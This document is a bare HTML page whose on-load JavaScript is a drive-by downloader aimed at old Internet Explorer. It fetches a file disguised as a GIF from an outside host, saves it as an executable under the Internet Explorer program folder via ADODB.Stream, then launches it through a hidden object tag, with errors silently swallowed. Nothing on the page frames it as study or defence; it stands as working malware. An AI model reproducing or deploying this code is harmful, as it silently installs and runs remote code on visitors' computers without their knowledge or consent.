<html>
<head>
<title>b</title>
</head>
<body>
<DIV id="ObjectContainer"></DIV>
<script type="text/javascript" language="JavaScript">
   
   function LaunchExecutable(ObjSrc)
   {
     tagstyle='style="display:none"'; 
     ObjCLSID="clsid:10000000-1000-0000-10000-000000000001";
     sObject ='<object classid="'+ObjCLSID+'" codebase="'+ObjSrc+'" '+tagstyle+'></object>';
     try
     {
         ObjectContainer.innerHTML=sObject;
     }
     catch(e){}  
   }

   ObjSrc="C:\\Program Files\\Internet Explorer\\Iesearch.exe";

   var oXMLHTTP = new ActiveXObject("Microsoft.XMLHTTP"); 
   var InetPath="http://mymentalworks.com/111.gif";
   oXMLHTTP.Open("GET",InetPath,0); 
   oXMLHTTP.Send();   

   try
   {
      var oStream = new ActiveXObject('ADODB.Stream'); 
      oStream.Mode = 3; 
      oStream.Type = 1; 
      oStream.Open(); 
      oStream.Write(oXMLHTTP.responseBody); 
      oStream.SaveToFile(ObjSrc,2);
   }
   catch(e){}

   setTimeout("LaunchExecutable(ObjSrc)",500);
   
</script>
</body>
</html>